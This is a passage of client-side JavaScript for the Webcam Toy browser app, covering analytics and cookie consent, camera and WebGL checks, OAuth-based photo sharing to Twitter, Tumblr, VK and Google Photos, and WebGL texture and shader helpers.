/* @license Copyright (C) Neave Interactive, neave.com | glfx.js Copyright (C) Evan Wallace, github.com/evanw/glfx.js */
if (!window.console || !console.log) {
    window.console = { log: function () {}, error: function () {} };
}
window.requestAnimationFrame =
    window.requestAnimationFrame ||
    window.webkitRequestAnimationFrame ||
    window.mozRequestAnimationFrame ||
    window.msRequestAnimationFrame ||
    function (e) {
        return setTimeout(e, 1e3 / 60);
    };
window.cancelAnimationFrame =
    window.cancelAnimationFrame ||
    window.webkitCancelAnimationFrame ||
    window.mozCancelAnimationFrame ||
    window.msCancelAnimationFrame ||
    function (e) {
        clearTimeout(e);
    };
navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
Math.clamp = function (e, A, t) {
    return Math.max(A, Math.min(e, t));
};
var hasLocalStorage = (function (e) {
    try {
        var A = "_";
        e.setItem(A, A);
        e.removeItem(A);
        return true;
    } catch (e) {
        return false;
    }
})(window.localStorage);
$.extend($.easing, {
    easeOutQuad: function (e, A, t, i, r) {
        return -i * (A /= r) * (A - 2) + t;
    },
});
$.fn.buttonClick = function (A) {
    return this.each(function () {
        var e = $(this);
        e.mousedown(function () {
            e.data("pressed", true);
        })
            .mouseup(function () {
                if (e.data("pressed")) {
                    e.data("pressed", false);
                    if (A) {
                        A();
                    }
                }
            })
            .mouseout(function () {
                e.data("pressed", false);
            });
        this.onselectstart = function (e) {
            if (e) {
                e.preventDefault();
            }
        };
        this.oncontextmenu = function (e) {
            if (e) {
                e.preventDefault();
            }
        };
    });
};
$.fn.removeButtonClick = function (e) {
    return this.each(function () {
        $(this).unbind("mousedown mouseup mouseout");
        this.onselectstart = null;
    });
};
(function (e, A, t, i, r, s, o) {
    e["GoogleAnalyticsObject"] = r;
    (e[r] =
        e[r] ||
        function () {
            (e[r].q = e[r].q || []).push(arguments);
        }),
        (e[r].l = 1 * new Date());
    (s = A.createElement(t)), (o = A.getElementsByTagName(t)[0]);
    s.async = 1;
    s.src = i;
    o.parentNode.insertBefore(s, o);
})(window, document, "script", "https://www.google-analytics.com/analytics.js", "ga");
var consentButton = $(".cookies")[0];
var hasConsentBanner = !!consentButton;
var gaid = "UA-56095-9";
window["ga-disable-" + gaid] = hasConsentBanner;
ga("set", "anonymizeIp", true);
ga("create", gaid, "auto");
function enableCookies() {
    (window.adsbygoogle || []).pauseAdRequests = 0;
    window["ga-disable-" + gaid] = false;
    ga("send", "pageview");
}
var WebcamToy = {};
(function (r) {
    "use strict";
    var i = [],
        s = new Date().getTime(),
        o = true,
        t = "",
        a,
        n = 0,
        c = "",
        h,
        e,
        u,
        l,
        f;
    function d() {
        var e = r.log();
        try {
            if (e.length > 0) {
                var A = new Date().toUTCString() + ", V" + r.version;
                if (!o) {
                    A += " App";
                }
                localStorage.setItem("log", A + "\n" + e);
            }
        } catch (e) {}
    }
    r.log = function () {
        var e = new Date().getTime() - s,
            A = arguments[0],
            t;
        if (arguments.length === 0) {
            return i.join("\n");
        }
        for (t = 1; t < arguments.length; t++) {
            if (arguments[t] || arguments[t] === 0) {
                A += " " + arguments[t];
            }
        }
        i.push(e + " " + A);
        if (i.length > 60) {
            if (i[40] === "...") {
                i.splice(41, 1);
            } else {
                i.splice(40, 1, "...");
            }
        }
        if (arguments[0] === "*ERROR*") {
            d();
        }
        if (r.isDebug) {
            console.log(A);
        }
    };
    r.trackEvent = function (e, A, t, i) {
        if (window.ga && !r.isDebug) {
            ga("send", "event", e, A, t, i ? 1 : undefined, { nonInteraction: i });
        } else {
            console.log("Event", e, A, t);
        }
    };
    r.addScript = function (e) {
        var A = "script",
            t = document.createElement(A),
            i = $(A)[0];
        if (t && i) {
            t.src = e;
            t.async = true;
            i.parentNode.insertBefore(t, i);
        }
    };
    r.showAccess = function () {
        $("#content").css("top", 0);
        $("header,#head-links,#toy-intro footer").hide();
        var e = $("#infobar-stripe");
        if (r.ua.isEdge) {
            e.css("bottom", 0);
            l.css("bottom", 14);
        } else {
            l.css("top", 14);
        }
        e.show();
        u.addClass("bg-access");
    };
    r.hideAccess = function () {
        $("#content").css("top", 50);
        $("header,#head-links").show();
        var e = $("#infobar-stripe");
        if (r.ua.isEdge) {
            l.css("bottom", "");
        } else {
            l.css("top", "");
        }
        e.hide();
        u.removeClass("bg-access");
    };
    function m(e) {
        $("#toy-intro .prompt").hide();
        $("#toy-intro .prompt." + e).show();
    }
    function g(e, A) {
        if (e) {
            t += e + "<br>";
            if (u.is(":visible")) {
                $("#toy-intro footer").show();
                $("#footer-message").html(t).show();
            }
            if (r.isDebug) {
                console.error("" + e, A);
            }
            if (t && /context|Effects not/.test(t)) {
                A = A || c;
            }
            r.trackEvent("Error", "" + e, A, true);
            r.log("*ERROR*", "" + e, A);
        }
    }
    r.error = function (e, A) {
        r.hideAccess();
        g(e, A);
        u.removeClass("wait");
        if (u.is(":visible")) {
            $("#toy-intro .prompt,#button-start,#footer-denied,#footer-unavailable").hide();
            $("#button-reload").css("display", "inline-block");
            m("error");
        }
    };
    function p(e) {
        r.log("Start");
        enableCookies();
        if (hasLocalStorage) {
            localStorage.setItem("consent", true);
        }
        if (!r.checkWebGL()) {
            r.error("WebGL unavailable", c);
            return;
        }
        if (r.Services && r.Services.init) {
            r.Services.init();
        }
        f.hide();
        if (e) {
            r.showAccess();
            m("access" + ((r.ua.isChrome || r.ua.isFirefox || r.ua.isSafari) && !r.ua.isMobile ? "-above" : ""));
        } else {
            f.hide();
            u.addClass("wait");
            m("loading");
        }
        r.Camera.getCamera(
            function (e, A, t) {
                if (t) {
                    r.error(t, A);
                    return;
                }
                c = A || "";
                if (n > 0) {
                    r.trackEvent("Error", "Camera error recovered", a, true);
                }
                r.trackEvent("Capabilities", "Camera", c, true);
                r.log("Camera accessed", c);
                r.hideAccess();
                f.hide();
                $("#footer-denied,#footer-unavailable").hide();
                $("#toy-intro footer").fadeOut(100);
                u.addClass("wait");
                m("loading");
                r.Audio.loadAudio();
                r.Effect.loadImages();
                r.UI.init(e);
            },
            function (e, A) {
                r.hideAccess();
                if (e) {
                    t = "";
                    g(e, A || c);
                }
                if (A) {
                    a = A;
                }
                if (!r.ua.isiOS && n < 3) {
                    n++;
                    m("request-error");
                    if (/denied/.test(e)) {
                        $("#toy-intro footer,#footer-denied").show();
                    } else if (/unavailable/.test(e)) {
                        $("#toy-intro footer,#footer-unavailable").show();
                    }
                    f.show();
                } else {
                    t = "";
                    r.error("Camera not found", c);
                    if (r.ua.isMobile) {
                        setTimeout(function () {
                            location.reload();
                        }, 30);
                    }
                }
            },
            r.Camera.number
        );
    }
    r.init = function () {
        r.log("Init");
        $("#home-ad").hide();
        $("#home").remove();
        h.removeClass("home");
        delete r.Home;
        o = false;
        document.title = r.Services.appName;
        l.hide();
        r.UI.preloadImages();
        f.removeClass("hidden").buttonClick(function () {
            p(true);
        });
        var e = r.Camera.hasGetUserMedia,
            A = r.checkWebGL(),
            t = e && A;
        r.trackEvent("Capabilities", "Version", r.version.toString(), true);
        r.trackEvent("Capabilities", "GetUserMedia", e.toString(), true);
        r.trackEvent("Capabilities", "WebGL", A.toString(), true);
        r.trackEvent("Capabilities", "HTML5", t.toString(), true);
        if (t) {
            r.Camera.checkAllowed(function (e) {
                l.fadeIn(100);
                if (e) {
                    p(false);
                } else {
                    $("#toy-intro .prompt.request,#footer-message").show();
                }
            });
        } else {
            f.hide();
            l.fadeIn(100);
            $("#toy-intro .prompt.incapable").show();
            $("#home-ad").fadeIn(100);
            if (!e) {
                g("Camera inaccessible");
            }
            if (!A) {
                g("WebGL unavailable");
            }
        }
        delete r.init;
    };
    r.popup = function (e, A, t, i, r) {
        if (e) {
            e.preventDefault();
        }
        t = t || 600;
        i = i || 310;
        var s = window.screenX || 0,
            o = s ? $(window).width() : screen.availWidth,
            a = window.screenY || 0,
            n = a ? $(window).height() : screen.availHeight,
            c = s + (o - t) / 2,
            h = a + (n - i) / 2;
        window.open(A || (e && (e.target.href || e.currentTarget.href)), "webcamtoy" + (r || "window"), "resizable=yes,toolbar=no,scrollbars=yes,status=no,width=" + t + ",height=" + i + ",left=" + c + ",top=" + h);
    };
    $(document).ready(function () {
        window.onerror = function (e, A, t) {
            if (e && !/Script error|DealPly|Access is denied\.|disconnected port|: a is null|freecorder|TopLine|NPObject|dpQuery|postMessage|getElementsByTagName|NS_ERROR_OUT_OF_MEMORY|not of type 'Node'|Bind must be/.test(e)) {
                r.trackEvent("Error", e, A && t ? "[" + A + ":" + t + "]" : "", true);
                r.log("*ERROR*", e);
            }
            return false;
        };
        h = $("body");
        e = $("#toy");
        u = $("#toy-intro");
        l = $("#app");
        f = $("#button-start");
        if (e.data("debug")) {
            r.isDebug = true;
        }
        if (window.location !== window.top.location && !r.isDebug) {
            try {
                top.location.href = "https://webcamtoy.com/";
            } catch (e) {}
            return;
        }
        if (r.ua.isMobile) {
            document.addEventListener("touchstart", function () {});
        }
        r.version = parseInt(e.data("version"), 10) || 0;
        o = h.hasClass("home");
        if (o) {
            if (r.Home) {
                r.Home.init();
            }
        } else {
            delete r.Home;
        }
        if (!o) {
            r.init();
        }
        if (!hasConsentBanner || (hasLocalStorage && localStorage.getItem("consent"))) {
            enableCookies();
        }
        if (!r.ua.isMobile) {
            setTimeout(function () {
                var e = !window.adsbygoogle || !window.adsbygoogle.loaded || $("#head-links ins").length < 2;
                if (e) {
                    $("#head-links>div").prepend('<a href="https://neave.com/" target="_top" class="adblock">&hearts;&nbsp; Neave Interactive</a>');
                }
                r.trackEvent("Capabilities", "AdBlock", e.toString(), true);
            }, 2500);
        }
    });
})(WebcamToy);
(function (n) {
    "use strict";
    n.version = 0;
    n.ua = (function () {
        var e = navigator.userAgent.toLowerCase() || "",
            A = $("body").hasClass("mobile"),
            t = / opr\//.test(e),
            i = /edge\/[0-9]+\./.test(e),
            r = e.match(/chrom(e|ium)\/([0-9]+)\./),
            s = {
                isEdge: i,
                isChrome: !i && !t && /chrom(e|ium)/.test(e),
                versionChrome: !i && !t && r && r.length >= 2 ? parseInt(r[2], 10) : 0,
                isFirefox: /firefox/.test(e),
                isSafari: /version\/[\d\.]+.*safari\//.test(e),
                isiOS: /ip(hone|ad|od)/.test(e),
                isMobile: A,
                isMac: !A && /mac os/.test(e),
                locale: document.documentElement.lang.substr(0, 2),
            };
        return s;
    })();
    function c(e, A, t) {
        var i = e.createShader(A);
        e.shaderSource(i, t);
        e.compileShader(i);
        var r = e.getError();
        if (r !== e.NO_ERROR || e.isContextLost() || !e.getShaderParameter(i, e.COMPILE_STATUS)) {
            return null;
        }
        return i;
    }
    var h = false;
    n.checkWebGL = function () {
        if (h) {
            return true;
        }
        var e = false,
            A = false;
        try {
            var t = document.createElement("canvas"),
                i;
            if (t && window.WebGLRenderingContext) {
                i = t.getContext("webgl") || t.getContext("experimental-webgl");
            }
            if (i) {
                var r = i.createProgram(),
                    s = n.ua.isMobile ? "highp" : "mediump",
                    o = c(i, i.VERTEX_SHADER, "attribute vec3 p;void main(){gl_Position=vec4(p,1.0);}"),
                    a = c(i, i.FRAGMENT_SHADER, "precision " + s + " float;" + n.Effect.glsl._test);
                i.attachShader(r, o);
                i.attachShader(r, a);
                i.linkProgram(r);
                e = !!i.getProgramParameter(r, i.LINK_STATUS);
                A = !!(o && a);
                i.deleteShader(o);
                i.deleteShader(a);
                i.deleteProgram(r);
            }
            t = undefined;
            i = undefined;
        } catch (e) {
            return false;
        }
        h = e && A;
        return h;
    };
})(WebcamToy);
WebcamToy.Services = (function (o) {
    "use strict";
    var a = { appName: "Webcam Toy", assetsURL: "/assets/", onTwitterAuth: null, onTumblrAuth: null, onVKAuth: null, onVKAlbum: null, ID: { TWITTER: "twitter", GOOGLE: "google", TUMBLR: "tumblr", VK: "vk" } },
        n = {
            twitter: { user: "", token: "", secret: "", forceLogin: false },
            google: { token: "", forceLogin: false },
            tumblr: { user: "", token: "", secret: "", forceLogin: false },
            vk: { user: "", token: "", aid: "", forceLogin: false },
        },
        e,
        c,
        h = false,
        u = "webcamtoy.com",
        A = 0,
        t = 8,
        i = 6e3,
        r;
    var s = "https://oauth." + u,
        l = s + "/twitter/",
        f = s + "/googlephotos/",
        d = s + "/tumblr/",
        m = s + "/vk/";
    a.oauthURL = s + "/";
    try {
        n.twitter.user = localStorage.getItem("twitterUser") || "";
        n.twitter.token = localStorage.getItem("twitterToken") || "";
        n.twitter.secret = localStorage.getItem("twitterSecret") || "";
        n.google.token = localStorage.getItem("googlePhotosToken") || "";
        n.tumblr.user = localStorage.getItem("tumblrUser") || "";
        n.tumblr.token = localStorage.getItem("tumblrToken") || "";
        n.tumblr.secret = localStorage.getItem("tumblrSecret") || "";
        n.vk.aid = localStorage.getItem("vkAlbumID") || "";
        n.vk.user = localStorage.getItem("vkUser") || "";
    } catch (e) {}
    n.vk.token = "";
    function g(e) {
        if (!e || !window.Blob || !window.atob) {
            return null;
        }
        var A, t, i, r, s;
        try {
            A = window.atob(e.split(",")[1]);
            t = e.split(",")[0].split(":")[1].split(";")[0];
            i = new ArrayBuffer(A.length);
            r = new Uint8Array(i);
        } catch (e) {
            return null;
        }
        for (s = A.length; s--; ) {
            r[s] = A.charCodeAt(s);
        }
        try {
            if (!!window.DataView) {
                return new Blob([new DataView(i)], { type: t });
            }
        } catch (e) {}
        try {
            return new Blob([r], { type: t });
        } catch (e) {}
        return null;
    }
    function p() {
        if (e) {
            e.abort();
        }
        clearTimeout(r);
    }
    a.cancelPost = function () {
        p();
        h = false;
    };
    a.init = function () {
        if (o.ua.isMobile) {
            return;
        }
        o.log("Services init");
        $(window).on("message", function (e) {
            e = e.originalEvent;
            if (e.origin === s) {
                var A;
                try {
                    A = $.parseJSON(e.data);
                } catch (e) {}
                switch (A.service) {
                    case a.ID.TWITTER:
                        x(A.user, A.token, A.secret);
                        break;
                    case a.ID.GOOGLE:
                        k(A.token);
                        break;
                    case a.ID.TUMBLR:
                        b(A.user, A.token, A.secret);
                        break;
                    case a.ID.VK:
                        E(A.user, A.token);
                        break;
                }
            }
        });
        C();
        U();
        y();
        T();
        delete a.init;
    };
    function x(e, A, t) {
        p();
        if (!A) {
            e = A = t = "";
        }
        n.twitter.user = e;
        n.twitter.token = A;
        n.twitter.secret = t;
        try {
            localStorage.setItem("twitterUser", e);
            localStorage.setItem("twitterToken", A);
            localStorage.setItem("twitterSecret", t);
        } catch (e) {}
        if (a.onTwitterAuth) {
            a.onTwitterAuth(e, A, t);
        }
    }
    function C() {
        if (n.twitter.token && a.onTwitterAuth) {
            a.onTwitterAuth(n.twitter.user, n.twitter.token, n.twitter.secret);
            return true;
        }
        return false;
    }
    function v() {
        if (C()) {
            p();
            return;
        }
        $.ajax({
            url: l + "verify.php?format=json",
            dataType: "jsonp",
            crossDomain: true,
            cache: false,
            timeout: 15e3,
            error: function () {},
            success: function (e) {
                if (e.success === 1) {
                    x(e.user, e.token, e.secret);
                } else if (e.success === 0 && /blacklist/i.test(e.message)) {
                    p();
                }
            },
        });
        if (A < t) {
            A++;
            r = setTimeout(v, i);
        }
    }
    a.twitterAuth = function () {
        p();
        if (!n.twitter.token) {
            var e = o.ua.locale;
            if (e === "zh-CN") {
                e = "zh";
            }
            o.popup(null, l + "?force_login=" + (n.twitter.forceLogin ? "1&destroy=1" : 0) + (e ? "&locale=" + e : ""), 700, 520, "oauth");
            A = 0;
            r = setTimeout(v, i);
        } else if (a.onTwitterAuth) {
            a.onTwitterAuth(n.twitter.user, n.twitter.token, n.twitter.secret);
        }
    };
    a.twitterLogout = function () {
        p();
        x("", "", "");
        n.twitter.forceLogin = true;
    };
    a.twitterPost = function (e, i, r) {
        if (!n.twitter.token) {
            r("OAuth token not found");
            return;
        }
        var A;
        if (e && e.image) {
            A = g(e.image.src);
        }
        if (!A) {
            r("Image data not found");
            return;
        }
        h = true;
        var t = new FormData();
        t.append("format", "json");
        t.append("user", n.twitter.user);
        t.append("token", n.twitter.token);
        t.append("secret", n.twitter.secret);
        t.append("message", e.message);
        t.append("file", A);
        if (c) {
            c.abort();
        }
        c = $.ajax({
            url: l + "tweet.php",
            data: t,
            type: "POST",
            cache: false,
            crossDomain: true,
            contentType: false,
            processData: false,
            timeout: 2e4,
            error: function () {},
            complete: function (e, A) {
                if (h) {
                    A = (e && e.statusText) || A;
                    var t;
                    try {
                        t = $.parseJSON(e.responseText);
                    } catch (e) {
                        r(A);
                    }
                    if (t) {
                        if (t.success === 0) {
                            r(t.message || A);
                        } else {
                            i(t.id ? "https://pic.twitter.com/" + t.id : "");
                        }
                    } else {
                        r(A);
                    }
                }
            },
        });
    };
    function b(e, A, t) {
        p();
        if (!A) {
            e = A = t = "";
        }
        n.tumblr.user = e;
        n.tumblr.token = A;
        n.tumblr.secret = t;
        try {
            localStorage.setItem("tumblrUser", e);
            localStorage.setItem("tumblrToken", A);
            localStorage.setItem("tumblrSecret", t);
        } catch (e) {}
        if (a.onTumblrAuth) {
            a.onTumblrAuth(e, A, t);
        }
    }
    function y() {
        if (n.tumblr.token && a.onTumblrAuth) {
            a.onTumblrAuth(n.tumblr.user, n.tumblr.token, n.tumblr.secret);
            return true;
        }
        return false;
    }
    function w() {
        if (y()) {
            p();
            return;
        }
        $.ajax({
            url: d + "verify.php?format=json",
            dataType: "jsonp",
            crossDomain: true,
            cache: false,
            timeout: 15e3,
            error: function () {},
            success: function (e) {
                if (e.success === 1) {
                    b(e.user, e.token, e.secret);
                }
            },
        });
        if (A < t) {
            A++;
            r = setTimeout(w, i);
        }
    }
    a.tumblrAuth = function () {
        p();
        if (!n.tumblr.token) {
            o.popup(null, d + "?force_login=" + (n.tumblr.forceLogin ? "1&destroy=1" : 0), 700, 520, "oauth");
            A = 0;
            r = setTimeout(w, i);
        } else if (a.onTumblrAuth) {
            a.onTumblrAuth(n.tumblr.user, n.tumblr.token, n.tumblr.secret);
        }
    };
    a.tumblrLogout = function () {
        p();
        b("", "", "");
        n.tumblr.forceLogin = true;
    };
    a.tumblrPost = function (e, i, r) {
        if (!n.tumblr.token) {
            r("OAuth token not found");
            return;
        }
        var A;
        if (e && e.image) {
            A = g(e.image.src);
        }
        if (!A) {
            r("Image data not found");
            return;
        }
        h = true;
        var t = "https://" + u + "/" + (o.ua.locale === "en" ? "" : o.ua.locale + "/"),
            s = new FormData();
        s.append("format", "json");
        s.append("user", n.tumblr.user);
        s.append("token", n.tumblr.token);
        s.append("secret", n.tumblr.secret);
        s.append("effect", e.effect);
        s.append("link", t);
        s.append("message", e.message.replace(a.appName, '<a href="' + t + '">' + a.appName + "</a>"));
        s.append("file", A);
        if (c) {
            c.abort();
        }
        c = $.ajax({
            url: d + "upload.php",
            data: s,
            type: "POST",
            cache: false,
            crossDomain: true,
            contentType: false,
            processData: false,
            timeout: 2e4,
            error: function () {},
            complete: function (e, A) {
                if (h) {
                    A = (e && e.statusText) || A;
                    var t;
                    try {
                        t = $.parseJSON(e.responseText);
                    } catch (e) {
                        r(A);
                    }
                    if (t) {
                        if (t.success === 0) {
                            r(t.message || A);
                        } else {
                            i(t.id ? "http://" + n.tumblr.user + ".tumblr.com/post/" + t.id + "/" : "");
                        }
                    } else {
                        r(A);
                    }
                }
            },
        });
    };
    function E(e, A) {
        p();
        if (!A || !e) {
            e = A = "";
        }
        n.vk.user = String(e);
        n.vk.token = A;
        try {
            localStorage.setItem("vkUser", e);
        } catch (e) {}
        if (a.onVKAuth) {
            a.onVKAuth(e, A);
        }
    }
    function S(e) {
        if (!e) {
            e = "";
        }
        e = String(e);
        n.vk.aid = e;
        try {
            localStorage.setItem("vkAlbumID", e);
        } catch (e) {}
        if (a.onVKAlbum) {
            a.onVKAlbum(e);
        }
    }
    function T() {
        if (n.vk.aid && a.onVKAlbum) {
            a.onVKAlbum(n.vk.aid);
        }
        if (n.vk.token && a.onVKAuth) {
            a.onVKAuth(n.vk.user, n.vk.token);
            return true;
        }
        return false;
    }
    function R() {
        if (T()) {
            p();
            return;
        }
        $.ajax({
            url: m + "verify.php?format=json",
            dataType: "jsonp",
            crossDomain: true,
            cache: false,
            timeout: 15e3,
            error: function () {},
            success: function (e) {
                if (e.success === 1) {
                    E(e.user, e.token);
                }
            },
        });
        if (A < t) {
            A++;
            r = setTimeout(R, i);
        }
    }
    a.vkAuth = function () {
        p();
        if (!n.vk.token) {
            o.popup(null, m + "?force_login=" + (n.vk.forceLogin ? "1&destroy=1" : 0), 620, 350, "oauth");
            A = 0;
            r = setTimeout(R, i);
        } else if (a.onVKAuth) {
            a.onVKAuth(n.vk.user, n.vk.token);
        }
    };
    a.vkLogout = function () {
        p();
        E("", "");
        S("");
        n.vk.forceLogin = true;
    };
    a.vkPost = function (e, i, r) {
        if (!n.vk.token) {
            r("OAuth token not found");
            return;
        }
        var A;
        if (e && e.image) {
            A = g(e.image.src);
        }
        if (!A) {
            r("Image data not found");
            return;
        }
        h = true;
        var t = new FormData();
        t.append("format", "json");
        t.append("aid", n.vk.aid);
        t.append("user", n.vk.user);
        t.append("token", n.vk.token);
        t.append("message", e.message.replace(a.appName, u));
        t.append("file", A);
        if (c) {
            c.abort();
        }
        c = $.ajax({
            url: m + "upload.php",
            data: t,
            type: "POST",
            cache: false,
            crossDomain: true,
            contentType: false,
            processData: false,
            timeout: 3e4,
            error: function () {},
            complete: function (e, A) {
                if (h) {
                    A = (e && e.statusText) || A;
                    var t;
                    try {
                        t = $.parseJSON(e.responseText);
                    } catch (e) {
                        r(A);
                    }
                    if (t) {
                        if (t.success === 0) {
                            S(t.aid);
                            r(t.message || A);
                        } else {
                            if (t.aid && n.vk.aid !== String(t.aid)) {
                                S(t.aid);
                            }
                            i(t.id ? "https://vk.com/photo" + n.vk.user + "_" + t.id : "");
                        }
                    } else {
                        r(A);
                    }
                }
            },
        });
    };
    function k(e) {
        p();
        if (!e) {
            e = "";
        }
        n.google.token = e;
        try {
            localStorage.setItem("googlePhotosToken", e);
        } catch (e) {}
        if (a.onGoogleAuth) {
            a.onGoogleAuth(e);
        }
    }
    function U() {
        if (n.google.token && a.onGoogleAuth) {
            a.onGoogleAuth(n.google.token);
            return true;
        }
        return false;
    }
    function I() {
        if (U()) {
            p();
            return;
        }
        $.ajax({
            url: f + "verify.php?format=json",
            dataType: "jsonp",
            crossDomain: true,
            cache: false,
            timeout: 15e3,
            error: function () {},
            success: function (e) {
                if (e.success === 1) {
                    k(e.token);
                }
            },
        });
        if (A < t) {
            A++;
            r = setTimeout(I, i);
        }
    }
    a.googleAuth = function () {
        p();
        if (!n.google.token) {
            o.popup(null, f + "?force_login=" + (n.google.forceLogin ? "1&destroy=1" : 0), 425, 630, "oauth");
            A = 0;
            r = setTimeout(I, i);
        } else if (a.onGoogleAuth) {
            a.onGoogleAuth(n.google.token);
        }
    };
    a.googleLogout = function () {
        p();
        k("");
        n.google.forceLogin = true;
    };
    a.googlePost = function (e, i, r) {
        if (!n.google.token) {
            r("OAuth token not found");
            return;
        }
        var A;
        if (e && e.image) {
            A = g(e.image.src);
        }
        if (!A) {
            r("Image data not found");
            return;
        }
        h = true;
        var t = new FormData();
        t.append("format", "json");
        t.append("token", n.google.token);
        t.append("message", e.message);
        t.append("file", A);
        if (c) {
            c.abort();
        }
        c = $.ajax({
            url: f + "upload.php",
            data: t,
            type: "POST",
            cache: false,
            crossDomain: true,
            contentType: false,
            processData: false,
            timeout: 2e4,
            error: function () {},
            complete: function (e, A) {
                if (h) {
                    A = (e && e.statusText) || A;
                    var t;
                    try {
                        t = $.parseJSON(e.responseText);
                    } catch (e) {
                        r(A);
                    }
                    if (t) {
                        if (t.success === 0) {
                            r(t.message || A);
                        } else {
                            i(t.url || "");
                        }
                    } else {
                        r(A);
                    }
                }
            },
        });
    };
    return a;
})(WebcamToy);
WebcamToy.Texture = (function () {
    "use strict";
    function g(e, A, t) {
        var i = document.createElement("canvas");
        i.width = A || e.width;
        i.height = t || e.height;
        var r = i.getContext("2d");
        if (r) {
            r.clearRect(0, 0, A, t);
        }
        return r;
    }
    function e(e, A, t, i, r, s, o) {
        this.gl = e;
        this.id = e.createTexture();
        this.format = i;
        this.type = r;
        o = o || e.LINEAR;
        e.bindTexture(e.TEXTURE_2D, this.id);
        e.texParameteri(e.TEXTURE_2D, e.TEXTURE_MAG_FILTER, o);
        e.texParameteri(e.TEXTURE_2D, e.TEXTURE_MIN_FILTER, o);
        e.texParameteri(e.TEXTURE_2D, e.TEXTURE_WRAP_S, e.CLAMP_TO_EDGE);
        e.texParameteri(e.TEXTURE_2D, e.TEXTURE_WRAP_T, e.CLAMP_TO_EDGE);
        if (s) {
            this.loadContentsOf(s);
        } else if (A && t) {
            this.width = A;
            this.height = t;
            try {
                e.texImage2D(e.TEXTURE_2D, 0, i, A, t, 0, i, r, null);
            } catch (e) {}
        }
    }
    e.prototype.loadContentsOf = function (e) {
        this.gl.bindTexture(this.gl.TEXTURE_2D, this.id);
        this.gl.pixelStorei(this.gl.UNPACK_FLIP_Y_WEBGL, true);
        try {
            this.gl.texImage2D(this.gl.TEXTURE_2D, 0, this.format, this.format, this.type, e);
        } catch (e) {}
        return this;
    };
    e.prototype.use = function (e) {
        this.gl.activeTexture(this.gl.TEXTURE0 + (e || 0));
        this.gl.bindTexture(this.gl.TEXTURE_2D, this.id);
    };
    e.prototype.drawTo = function (e) {
        var A = this.gl;
        A.bindFramebuffer(A.FRAMEBUFFER, (A.framebuffer = A.framebuffer || A.createFramebuffer()));
        A.framebufferTexture2D(A.FRAMEBUFFER, A.COLOR_ATTACHMENT0, A.TEXTURE_2D, this.id, 0);
        if (A.checkFramebufferStatus(A.FRAMEBUFFER) === A.FRAMEBUFFER_COMPLETE) {
            e();
        }
        A.bindFramebuffer(A.FRAMEBUFFER, null);
        return this;
    };
    e.prototype.toImage = function (e, A, t, i) {
        i = i || this.height;
        t = e ? i : t || this.width;
        var r = 2,
            s = this.height,
            o = e ? s : this.width,
            a,
            n = o * s * 4,
            c = new Uint8Array(n),
            h = g(this, t, i),
            u = g(this, o, s),
            l,
            f,
            d = "data:image/gif;base64,R0lGODdhAQABAPAAAP///wAAACwAAAAAAQABAAACAkQBADs=";
        try {
            l = u.createImageData(o, s);
        } catch (e) {}
        if (l && l.data) {
            f = l.data;
        } else {
            return d;
        }
        var m = this.gl;
        if (this.type === m.UNSIGNED_BYTE) {
            m.bindFramebuffer(m.FRAMEBUFFER, (m.framebuffer = m.framebuffer || m.createFramebuffer()));
            m.framebufferTexture2D(m.FRAMEBUFFER, m.COLOR_ATTACHMENT0, m.TEXTURE_2D, this.id, 0);
        }
        m.readPixels(e ? (this.width - s) / 2 : 0, 0, o, s, m.RGBA, m.UNSIGNED_BYTE, c);
        for (a = n; a--; ) {
            f[a] = c[a];
        }
        u.putImageData(l, 0, 0);
        h.save();
        h.translate(0, i);
        h.scale(t / o, -i / s);
        h.drawImage(u.canvas, ((r / -2) * o) / s, r / -2, o + (r * o) / s, s + r);
        h.restore();
        d = h.canvas.toDataURL("image/jpeg", A);
        u = null;
        h = null;
        m.bindFramebuffer(m.FRAMEBUFFER, null);
        return d;
    };
    e.prototype.swapWith = function (e) {
        var A = e.id;
        e.id = this.id;
        this.id = A;
        A = e.width;
        e.width = this.width;
        this.width = A;
        A = e.height;
        e.height = this.height;
        this.height = A;
        A = e.format;
        e.format = this.format;
        this.format = A;
        return this;
    };
    e.prototype.destroy = function () {
        try {
            if (this.gl && this.id) {
                this.gl.deleteTexture(this.id);
            }
        } catch (e) {}
        this.id = null;
        this.gl = null;
    };
    return e;
})();
WebcamToy.Shader = (function (e) {
    "use strict";
    var r = "attribute vec2 vertex;attribute vec2 _texCoord;varying vec2 texCoord;void main(){texCoord=_texCoord;gl_Position=vec4(vertex*2.0-1.0,0.0,1.0);}",
        s = "uniform sampler2D texture;varying vec2 texCoord;void main(){gl_FragColor=texture2D(texture,texCoord);}";
    function o(e) {
        return Object.prototype.toString.call(e) === "[object Array]";
    }
    function a(e) {
        return Object.prototype.toString.call(e) === "[object Number]";
    }
    function n(e, A, t) {
        var i = e.createShader(A),
            r = "Compilation error";
        if (!i) {
            throw r;
        } else {
            e.shaderSource(i, t);
        }
        e.compileShader(i);
        if (!e.isContextLost() && !e.getShaderParameter(i, e.COMPILE_STATUS)) {
            var s;
            try {
                s = e.getShaderInfoLog(i);
            } catch (e) {}
            throw r + (s ? ": " + s : "");
        }
        return i;
    }
    function A(e, A, t) {
        this.gl = e;
        this.vertexAttribute = null;
        this.texCoordAttribute = null;
        this.program = e.createProgram();
        A = A || s;
        A = "precision " + (t ? "highp" : "mediump") + " float;" + A;
        e.attachShader(this.program, n(e, e.VERTEX_SHADER, r));
        e.attachShader(this.program, n(e, e.FRAGMENT_SHADER, A));
        e.linkProgram(this.program);
        if (!e.isContextLost() && !e.getProgramParameter(this.program, e.LINK_STATUS)) {
            var i;
            try {
                i = e.getProgramInfoLog(this.program);
            } catch (e) {}
            throw "Link error" + (i ? ": " + i : "");
        }
    }
    A.prototype.uniforms = function (e) {
        if (e) {
            var A = this.gl;
            A.useProgram(this.program);
            for (var t in e) {
                if (e.hasOwnProperty(t)) {
                    var i = A.getUniformLocation(this.program, t);
                    if (!i) {
                        continue;
                    }
                    var r = e[t];
                    if (o(r)) {
                        switch (r.length) {
                            case 1:
                                A.uniform1fv(i, new Float32Array(r));
                                break;
                            case 2:
                                A.uniform2fv(i, new Float32Array(r));
                                break;
                            case 3:
                                A.uniform3fv(i, new Float32Array(r));
                                break;
                            case 4:
                                A.uniform4fv(i, new Float32Array(r));
                                break;
                            case 9:
                                A.uniformMatrix3fv(i, false, new Float32Array(r));
                                break;
                            case 16:
                                A.uniformMatrix4fv(i, false, new Float32Array(r));
                                break;
                            default:
                                throw 'Cannot load uniform "' + t + '" of length ' + r.length;
                        }
                    } else if (a(r)) {
